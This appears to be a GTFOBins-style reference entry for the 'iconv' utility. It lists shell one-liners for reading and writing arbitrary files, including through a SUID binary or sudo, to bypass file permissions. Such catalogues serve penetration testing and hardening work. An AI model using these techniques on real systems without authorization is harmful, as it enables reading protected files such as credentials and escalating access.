---
description: The `8859_1` encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result.
functions:
  file-write:
    - code: |
        LFILE=file_to_write
        echo "DATA" | iconv -f 8859_1 -t 8859_1 -o "$LFILE"
  file-read:
    - code: |
        LFILE=file_to_read
        iconv -f 8859_1 -t 8859_1 "$LFILE"
  suid:
    - code: |
        LFILE=file_to_read
        ./iconv -f 8859_1 -t 8859_1 "$LFILE"
  sudo:
    - code: |
        LFILE=file_to_read
        ./iconv -f 8859_1 -t 8859_1 "$LFILE"
---
